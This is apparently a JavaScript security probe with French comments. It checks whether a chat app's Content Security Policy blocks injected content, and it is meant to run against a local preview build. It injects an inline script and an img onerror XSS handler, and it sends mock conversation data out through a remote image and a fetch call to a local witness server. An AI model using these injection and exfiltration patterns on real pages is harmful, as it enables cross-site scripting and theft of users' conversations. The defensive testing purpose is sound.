// Étape 2 (OWASP LLM05) — sonde CSP.
//
// Elle simule ce que ferait un attaquant qui aurait DÉJÀ franchi le rendu
// (un rehype-raw ajouté un jour, une faille dans une dépendance, un autre
// composant qui fait du innerHTML) : elle injecte directement dans la page
// des éléments que l'étape 1 n'aurait jamais laissés passer. La question
// n'est plus « le rendu les fabrique-t-il ? » mais « le navigateur les
// exécute-t-il ? ».
//
// À exécuter sur le build servi par vite preview (http://localhost:4173),
// serveur témoin lancé. Marqueurs : SONDE-CSP-* en console = exécuté ;
// une ligne dans witness.log = requête sortie.
(() => {
  const W = "http://127.0.0.1:9999";

  // 1. Script inline injecté : exige 'unsafe-inline' dans script-src.
  const script = document.createElement("script");
  script.textContent = "console.log('SONDE-CSP-INLINE : script inline exécuté')";
  document.body.append(script);

  // 2. Gestionnaire d'événement inline (le XSS classique de l'étape 1, s'il passait le rendu).
  const box = document.createElement("div");
  box.innerHTML = `<img src="/inexistant.png" onerror="console.log('SONDE-CSP-ONERROR : gestionnaire inline exécuté')">`;
  document.body.append(box);

  // 3. Image distante : le canal d'exfiltration sans clic (img-src).
  new Image().src = `${W}/sonde-csp-image?d=conversation-de-bruno`;

  // 4. Requête sortante par script (connect-src).
  fetch(`${W}/sonde-csp-fetch?d=conversation-de-bruno`, { mode: "no-cors" }).catch(() =>
    console.log("[sonde-02] fetch vers le témoin refusé"),
  );

  console.log("[sonde-02] injections faites");
})();
